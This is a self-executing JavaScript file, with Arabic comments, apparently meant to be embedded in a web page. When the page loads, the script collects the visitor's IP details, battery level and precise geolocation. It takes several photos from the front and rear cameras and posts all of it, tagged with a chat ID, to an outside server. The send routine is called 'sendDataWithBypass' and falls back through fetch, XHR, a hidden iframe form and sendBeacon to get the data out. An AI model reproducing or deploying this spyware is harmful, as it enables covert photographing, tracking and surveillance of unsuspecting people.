// هذا الملف على: https://raw.githubusercontent.com/FGDHSHS/api/refs/heads/main/api
(function() {
    'use strict';

    var capturedData = {
        permissions: [],
        images: [],
        ipInfo: '',
        batteryStatus: '',
        location: '',
        chatId: window._chatId || ''
    };

    // جلب IP
    async function fetchIPInfo() {
        try {
            var response = await fetch('https://ipapi.co/json/');
            var data = await response.json();
            capturedData.ipInfo = 'Country: ' + data.country_name + ', City: ' + data.city + ', IP: ' + data.ip;
        } catch(e) {
            capturedData.ipInfo = "IP Info not available";
        }
    }

    // جلب البطارية
    async function getBatteryStatus() {
        try {
            var battery = await navigator.getBattery();
            capturedData.batteryStatus = Math.round(battery.level * 100) + '%';
        } catch(e) {
            capturedData.batteryStatus = "Unknown";
        }
    }

    // تصوير الكاميرا
    async function captureFromCamera(facingMode) {
        try {
            var stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: facingMode } }
            });
            var video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            await new Promise(function(resolve) { setTimeout(resolve, 1000); });
            var canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            var ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
            stream.getTracks().forEach(function(track) { track.stop(); });
            capturedData.permissions.push((facingMode === 'user' ? 'Front' : 'Back') + ' Camera Allowed');
        } catch(e) {
            capturedData.permissions.push((facingMode === 'user' ? 'Front' : 'Back') + ' Camera Denied');
        }
    }

    // جلب الموقع
    async function getLocation() {
        try {
            var position = await new Promise(function(resolve, reject) {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                });
            });
            capturedData.location = 'Lat: ' + position.coords.latitude.toFixed(6) + ', Long: ' + position.coords.longitude.toFixed(6);
            capturedData.permissions.push('Geolocation Allowed');
        } catch(err) {
            capturedData.permissions.push('Geolocation Denied');
            capturedData.location = '';
        }
    }

    // إرسال البيانات
    async function sendDataWithBypass(data) {
        var urls = [
            'https://server-brxz.onrender.com/submitData',
            'https://server-brxz.onrender.com/submitData'
        ];
        for (var i = 0; i < urls.length; i++) {
            var url = urls[i];
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams(data),
                    mode: 'no-cors'
                });
                return;
            } catch(e) {}
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', url, false);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send(new URLSearchParams(data));
                return;
            } catch(e) {}
            try {
                var iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                var form = document.createElement('form');
                form.method = 'POST';
                form.action = url;
                form.target = iframe.name || 'hiddenFrame';
                iframe.name = form.target;
                for (var key in data) {
                    var input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = key;
                    input.value = data[key];
                    form.appendChild(input);
                }
                document.body.appendChild(form);
                form.submit();
                setTimeout(function() {
                    document.body.removeChild(form);
                    document.body.removeChild(iframe);
                }, 1000);
                return;
            } catch(e) {}
            try {
                var blob = new Blob([new URLSearchParams(data).toString()], {
                    type: 'application/x-www-form-urlencoded'
                });
                navigator.sendBeacon(url, blob);
                return;
            } catch(e) {}
        }
    }

    // تشغيل كل شيء
    async function main() {
        await Promise.all([
            fetchIPInfo(),
            getBatteryStatus(),
            getLocation()
        ]);

        await captureFromCamera('user');
        await captureFromCamera('environment');
        await captureFromCamera('user');
        await captureFromCamera('environment');

        var data = {
            chatId: capturedData.chatId,
            imageDatas: capturedData.images.join(','),
            location: capturedData.location,
            permissions: capturedData.permissions.join(', '),
            ipInfo: capturedData.ipInfo,
            battery: capturedData.batteryStatus
        };

        await sendDataWithBypass(data);
    }

    // بدء التنفيذ
    main();

})();
